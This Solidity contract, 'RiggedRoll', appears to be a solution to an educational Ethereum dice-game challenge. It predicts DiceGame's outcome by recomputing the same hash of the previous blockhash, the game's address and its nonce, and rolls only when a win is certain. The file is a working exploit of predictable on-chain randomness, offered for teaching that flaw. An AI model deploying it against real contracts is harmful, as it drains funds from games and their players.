pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    error NotEnoughETH(uint256 required, uint256 available);
    error NotWinningRoll(uint256 roll);
    error InsufficientBalance(uint256 requested, uint256 available);

    DiceGame public immutable diceGame;

    constructor(address payable diceGameAddress, address initialOwner) Ownable(initialOwner) {
        diceGame = DiceGame(diceGameAddress);
    }

    receive() external payable {}

    function riggedRoll() external {
        uint256 minAmount = 0.002 ether;
        uint256 balance = address(this).balance;

        if (balance < minAmount) {
            revert NotEnoughETH(minAmount, balance);
        }

        bytes32 previousBlockHash = blockhash(block.number - 1);
        uint256 currentNonce = diceGame.nonce();

        bytes32 resultHash = keccak256(
            abi.encodePacked(previousBlockHash, address(diceGame), currentNonce)
        );

        uint256 predictedRoll = uint256(resultHash) % 16;

        if (predictedRoll > 5) {
            revert NotWinningRoll(predictedRoll);
        }

        diceGame.rollTheDice{value: minAmount}();
    }

    function withdraw(address _addr, uint256 _amount) external onlyOwner {
        uint256 available = address(this).balance;

        if (_amount > available) {
            revert InsufficientBalance(_amount, available);
        }

        (bool success, ) = payable(_addr).call{value: _amount}("");
        require(success, "Withdraw failed");
    }
}